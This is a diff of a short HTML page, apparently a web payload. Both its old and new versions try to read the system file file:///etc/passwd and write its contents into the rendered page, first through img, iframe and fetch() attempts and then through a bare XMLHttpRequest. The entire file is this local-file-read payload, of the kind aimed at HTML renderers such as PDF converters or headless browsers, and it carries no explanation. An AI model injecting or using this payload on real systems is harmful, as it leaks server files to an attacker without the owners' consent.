@@ -1,28 +1,15 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>XMLHttpRequest Test</title>
-  <style>
-    body {
-      font-family: monospace;
-      white-space: pre-wrap;
-    }
-  </style>
-</head>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
 <body>
-<pre>
-<img src="file:///etc/passwd">
-</pre>
-<iframe src="data:text/html,<img src='file:///etc/passwd'>"></iframe>
 
 <script>
-fetch('file:///etc/passwd').then(r => r.text()).then(t => {
-  document.body.innerHTML = "<pre>" + t + "</pre>";
-}).catch(e => {
-  document.body.innerHTML = "<pre>Access denied to file:///etc/passwd</pre>";
-});
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
 </script>
 
-</body>
-</html>
+</body></html>
